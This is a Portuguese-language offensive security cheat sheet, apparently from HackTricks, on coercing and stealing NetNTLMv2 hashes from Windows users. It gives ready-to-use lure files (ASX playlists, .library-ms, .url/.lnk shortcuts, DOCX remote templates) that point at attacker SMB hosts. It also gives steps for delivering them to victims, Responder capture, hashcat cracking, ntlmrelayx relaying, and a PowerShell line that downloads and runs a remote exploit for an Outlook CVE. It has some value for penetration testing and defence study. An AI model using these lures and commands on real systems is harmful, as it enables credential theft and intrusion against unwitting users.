# Locais para roubar credenciais NTLM

{{#include ../../banners/hacktricks-training.md}}

**Confira todas as ótimas ideias de [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) desde o download de um arquivo microsoft word online até a fonte de ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Writable SMB share + iscas UNC acionadas pelo Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se você puder **escrever em um share que usuários ou jobs agendados acessam no Explorer**, coloque arquivos cujos metadados apontem para o seu UNC (por exemplo, `\\ATTACKER\share`). A renderização da pasta aciona **autenticação SMB implícita** e faz leak de um **NetNTLMv2** para o seu listener.<sup>[[1]](#references)</sup>

1. **Gere iscas** (abrange SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Coloque-os no compartilhamento com permissão de escrita** (qualquer pasta que a vítima abra):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
O Windows pode acessar vários arquivos de uma só vez; qualquer coisa que o Explorer visualize em prévia (`BROWSE TO FOLDER`) não exige cliques.

### Playlists do Windows Media Player (.ASX/.WAX)

Se você conseguir fazer um alvo abrir ou visualizar em prévia uma playlist do Windows Media Player sob seu controle, poderá fazer leak de Net-NTLMv2 apontando a entrada para um caminho UNC. O WMP tentará buscar a mídia referenciada via SMB e se autenticará implicitamente.<sup>[[3]](#references)[[4]](#references)</sup>

Exemplo de payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Fluxo de coleta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

O Windows Explorer lida de forma insegura com arquivos .library-ms quando eles são abertos diretamente de dentro de um arquivo ZIP. Se a definição da biblioteca apontar para um caminho UNC remoto (por exemplo, \\attacker\share), simplesmente navegar até ou iniciar o .library-ms dentro do ZIP faz com que o Explorer enumere a UNC e envie autenticação NTLM para o attacker. Isso gera um NetNTLMv2 que pode ser crackeado offline ou potencialmente retransmitido.<sup>[[2]](#references)</sup>

Minimal .library-ms apontando para uma UNC do attacker
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Etapas operacionais
- Crie o arquivo .library-ms com o XML acima (defina seu IP/hostname).
- Compacte-o (no Windows: Enviar para → Pasta compactada (zipada)) e entregue o ZIP ao alvo.
- Execute um listener de captura de NTLM e aguarde a vítima abrir o .library-ms de dentro do ZIP.


### Caminho do som do lembrete do calendário do Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

O Microsoft Outlook para Windows processava a propriedade MAPI estendida PidLidReminderFileParameter nos itens de calendário. Se essa propriedade apontasse para um caminho UNC (por exemplo, \\attacker\share\alert.wav), o Outlook entraria em contato com o compartilhamento SMB quando o lembrete fosse acionado, causando um leak do Net-NTLMv2 do usuário sem nenhum clique. Isso foi corrigido em 14 de março de 2023, mas ainda é altamente relevante para frotas legadas/não atualizadas e para resposta a incidentes históricos.<sup>[[5]](#references)</sup>

Exploração rápida com PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lado do listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- A vítima só precisa estar com o Outlook for Windows em execução quando o lembrete for acionado.
- O leak fornece Net‑NTLMv2 adequado para offline cracking ou relay (não pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass de CVE‑2025‑24054)

O Windows Explorer renderiza automaticamente os ícones dos atalhos. Pesquisas recentes mostraram que, mesmo após o patch da Microsoft de abril de 2025 para atalhos com ícones UNC, ainda era possível acionar a autenticação NTLM sem nenhum clique, hospedando o destino do atalho em um caminho UNC e mantendo o ícone local (o bypass do patch recebeu a identificação CVE‑2025‑50154). Apenas visualizar a pasta faz com que o Explorer recupere metadados do destino remoto, emitindo NTLM para o servidor SMB do atacante.<sup>[[6]](#references)</sup>

Payload mínimo de Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload de atalho de programa (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideias de entrega
- Coloque o atalho em um ZIP e faça a vítima navegá-lo.
- Coloque o atalho em um compartilhamento com permissão de escrita que a vítima abrirá.
- Combine-o com outros arquivos de isca na mesma pasta para que o Explorer faça a pré-visualização dos itens.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

O Windows carrega metadados de `.lnk` durante a **visualização/pré-visualização** (renderização do ícone), não apenas durante a execução. A CVE‑2026‑25185 mostra um caminho de parsing em que blocos **ExtraData** fazem o shell resolver um caminho de ícone e acessar o filesystem **durante o carregamento**, emitindo NTLM de saída quando o caminho é remoto.

Condições principais para o acionamento (observadas em `CShellLink::_LoadFromStream`):
- Inclua **DARWIN_PROPS** (`0xa0000006`) em ExtraData (gate para a rotina de atualização do ícone).
- Inclua **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) com **TargetUnicode** preenchido.
- O loader expande as variáveis de ambiente em `TargetUnicode` e chama `PathFileExistsW` no caminho resultante.

Se `TargetUnicode` resolver para um caminho UNC (por exemplo, `\\attacker\share\icon.ico`), **apenas visualizar uma pasta** que contenha o atalho fará com que ocorra autenticação de saída. O mesmo caminho de carregamento também pode ser acionado por **indexação** e **varredura de AV**, tornando-o uma superfície prática de leak sem clique.<sup>[[7]](#references)</sup>

Ferramentas de pesquisa (parser/generator/UI) estão disponíveis no projeto **LnkMeMaybe** para criar/inspecionar essas estruturas sem usar a GUI do Windows.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

O cliente nativo **WebDAV** pode ser abusado para forçar a sessão de logon atual a se autenticar em um endpoint **HTTP/WebDAV** arbitrário:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Por que isso é útil:
- Contra um **servidor WebDAV controlado pelo atacante**, isso pode disparar **NTLM over HTTP** sem instalar um cliente personalizado.
- Contra **hosts internos**, é uma forma discreta de **validar onde credenciais roubadas são aceitas** antes de iniciar o **lateral movement**.<sup>[[9]](#references)</sup>
- O comando é uma boa alternativa quando a **saída SMB é filtrada**, mas **HTTP/WebDAV** ainda está acessível.

Notas operacionais:
- O serviço **WebClient** deve estar em execução no host de origem.
- `rundll32.exe` carrega `davclnt.dll` e faz o Windows gerenciar a autenticação WebDAV usando as **credenciais do usuário atual**.<sup>[[10]](#references)</sup>
- Se você apontá-lo para uma infraestrutura sob seu controle, use um HTTP listener/relay compatível com NTLM, como:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From a detection perspective, execuções repetidas de `rundll32.exe davclnt.dll,DavSetCookie` contra muitos sistemas internos são um forte indicador de **credential validation / preparação de lateral movement semelhante a spray**, e não de comportamento normal de usuários.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

Documentos do Office podem referenciar um template externo. Se você definir o template anexado como um caminho UNC, a abertura do documento autenticará no SMB.

Alterações mínimas nas relationships do DOCX (dentro de word/):

1) Edite word/settings.xml e adicione a referência ao template anexado:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edite word/_rels/settings.xml.rels e aponte rId1337 para o seu UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Reempacote como .docx e entregue. Execute seu listener de captura SMB e aguarde a abertura.

Para ideias de pós-captura sobre relay ou abuso de NTLM, consulte:

{{#ref}}
README.md
{{#endref}}


## Referências
- [1] [HTB: Breach – Iscas em compartilhamentos graváveis + captura com Responder → crack de NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak de autenticação via ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 para DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak de NTLM pelo WMP → junction NTFS para webroot RCE → FullPowers + GodPotato para SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilidades do NTLM: ameaças de elevação de privilégio não corrigidas no Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga EoP do Outlook (CVE‑2023‑23397) e explica o leak de NTLM via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, um NTLM: bypass do patch de segurança da Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: uma análise do CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Ferramenta LnkMeMaybe da TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quando o suporte de TI liga: dissecação de uma campanha ModeloRAT, do Teams ao comprometimento do domínio](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – cabeçalho davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – requisição WebDAV do Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Locais de interesse para roubar hashes NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
